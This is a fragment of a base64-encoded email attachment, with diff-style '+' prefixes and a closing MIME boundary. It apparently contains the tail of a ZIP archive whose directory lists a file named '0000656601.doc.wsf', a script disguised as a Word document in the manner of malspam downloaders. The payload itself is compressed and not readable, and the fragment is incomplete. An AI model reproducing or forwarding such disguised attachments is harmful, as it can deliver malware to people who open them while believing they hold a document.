+sxr9wIYsXiDHjNfe85DJfZYrz4HIPAI5jmqqjDYhOu32g/UiyLnsqhiiY35u3JWsQdFNSmVA47KC
+
+AjEVaXqLf3PXysuOaIVcEEAs36QzU444G4kZLgioYUwywnnplGVV4VZc2ht2MRYEYSrS+7T4tSZ5
+
+zYSKiCgARCEDzpJ+oGLti42T3K1HblJz3WfULSqZmoNqnghTNCQqdEFAgVqXOd0tUX1NNW8IQD15
+
+lV2SWB7NbTxuyIqkMpE630haFwK1CRcIj2S2pZ3PxM1rGWuu21746XjRWOlJxjhpgNI+1DjtnvS+
+
+XA/UOKwJivA6XYsJvxXMjfQG4A4y92K8jZOrS7e63SjuunuygdqRzA/O0RGgp7e69i4dqKcv8Lrd
+
+l7edelouklJ7bnd5jHo/lev6V2eDm6NeFzQ/G4lysVtCs+yXqSWXaVQ43vUwxjotCmlxn0nBQZcP
+
+Tk+R3PHO9979WfctD5v3nX/rf0XtM9Q+hc001O6o/Rk5AmNHDOUygXoQONWik9LRPHctYM0+l2S/
+
+hpxMybicVINoF921ttR1KG1pEAOrwOm2zqJXsUvQNeqSr4Ed3NYqbzRlfIsNZHcJyEpyUCtPEsBf
+
+ahkCarlQce8edEuv4jNB8e1oaaKgsKAsw5pkTcO2E9beyrQhilIU9NzftbBNJqNaeQDIea1R6/1A
+
+AwpZf2TlMnU11U1We3FXrYrYRCZlsbbvWq2TJYVB7/atuZbI7cRLse8s9UGhwtBQlqIg4q+nCxBQ
+
+cxyra25Iw1N3isPyBWov1DNAfYWNozw/xQJvuC5cxW/FYP0fREuSSaeAVMxoaEUCQDJlB4GavjZ7
+
+hMi6UqnaH6LWelyvz6DSOpZcB965KfFwNq9VRFxFb1C6YK3Z1dcb9ahKcsOgCYFxBX7Jn+cX2uBS
+
+yrjxiZPiuoDP/4zcpWWXFIbI3dpuVhgBgUZncJqBoNiiGeuVpga6mxypvh0xbgxiJ/rSp+YRhECV
+
+ouy6WzPoV18dV5ddWeBWaNk+CgxR27Op2qnb9RmbHpUDGvUigxp+QMhQqBud5rUtCP0q983drMa0
+
+b5qP8J6zfc12dZ03g0/Cqv0Ga/o2fQAV/toOTrsXjvWd0bNlMsQj2tmwvhvvXAP9UKx1QdxVA/qn
+
+TtmGAfs0o1hgW+RHw4WoxwZTd0gqxbN9TwOUFVWBdBudr/Vm1b55DDN0+9Z33bOWLyD8VNYOIvc4
+
+a8gfNjuH7fIPn7w9bKs/g/IfUEsBAgAAFAAAAAgAfQ1NSU6gcvjRGQAAzBkAAD8AAAAAAAAAAAAg
+
+AAAAAAAAAAB6YmV6b3FqbWtmYWRzanlzemRlYm1iZXJhYWFuanR0ZWR0dXFiZ2Nmd3pqanNqeHNq
+
+bnlqdW51c3R0eGNvZlBLAQIAABQAAAAIAH0NTUlk//XvxwsAAAxFAAASAAAAAAAAAAAAIAAAAC4a
+
+AAAwMDAwNjU2NjAxLmRvYy53c2ZQSwUGAAAAAAIAAgCtAAAAJSYAAAAA
+
+
+--b1_98b6392f89f35668fa1a12fd23814390--
